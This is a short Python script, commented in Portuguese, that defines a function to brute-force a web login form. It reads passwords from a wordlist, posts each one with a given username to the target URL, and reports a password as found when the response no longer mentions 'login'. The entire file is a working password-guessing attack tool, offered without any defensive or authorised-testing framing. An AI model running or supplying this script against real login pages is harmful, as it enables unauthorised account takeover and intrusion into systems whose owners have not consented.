import requests

def brute_http_login(url, user, wordlist_path):
    with open(wordlist_path, 'r') as wordlist:
        for pwd in wordlist:
            pwd = pwd.strip()
            data = {'username': user, 'password': pwd}
            r = requests.post(url, data=data)
            if "login" not in r.text.lower():  # Ajustar ao sistema real
                print(f"[+] Sucesso! Senha: {pwd}")
                return
            else:
                print(f"[-] Senha incorreta: {pwd}")
    print("[-] Nenhuma senha funcionou.")
